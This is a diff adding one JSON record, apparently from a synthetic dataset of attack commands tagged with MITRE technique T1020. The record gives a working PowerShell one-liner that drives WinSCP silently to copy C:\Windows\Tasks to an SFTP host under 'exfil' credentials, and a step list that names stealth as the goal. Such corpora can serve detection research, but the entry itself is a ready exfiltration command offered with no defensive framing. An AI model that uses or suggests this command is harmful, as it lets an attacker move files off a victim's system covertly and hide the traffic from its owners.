@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$r=\"/tasks/\"; & 'C:\\Program Files (x86)\\WinSCP\\WinSCP.com' /ini=nul /command 'option batch on' 'option confirm off' 'open sftp://exfil:S3cr3t!@198.51.100.80/ -hostkey=\"ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\"' (\"synchronize remote C:\\Windows\\Tasks `\"$r`\" -criteria=time -filemask=`\"|*.tmp;|*.log`\"\") 'exit' | Out-Null 2>$null",
+  "explanation": "Uses WinSCP's synchronize mode to automatically mirror scheduled task files to a remote SFTP location while excluding noisy extensions.",
+  "rationale_steps": [
+    "Define mirroring strategy and exclusions",
+    "Connect via SFTP with host key pinning in batch mode",
+    "Synchronize remote with timestamp comparison only",
+    "Suppress all output to remain stealthy"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-1f3f2541-1d14d8b8",
+  "source_prompt_hash": "1f3f2541",
+  "timestamp_utc": "2025-09-30T09:07:17.472275Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
